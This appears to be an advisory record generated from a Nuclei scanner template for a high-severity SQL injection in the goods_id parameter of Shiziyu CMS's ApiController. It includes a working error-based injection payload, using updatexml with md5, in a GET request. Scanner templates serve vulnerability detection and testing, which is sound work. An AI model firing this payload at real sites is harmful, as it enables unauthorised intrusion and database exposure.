# Nuclei Template: Shiziyu CMS Api Controller - SQL Injection
**Template ID:** shiziyu-cms-apicontroller-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`shiziyu-cms-apicontroller-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Shiziyu CMS ApiController.class.php parameter filtering is not rigorous, resulting in SQL injection vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5({{num}}),0x7e),1)
```

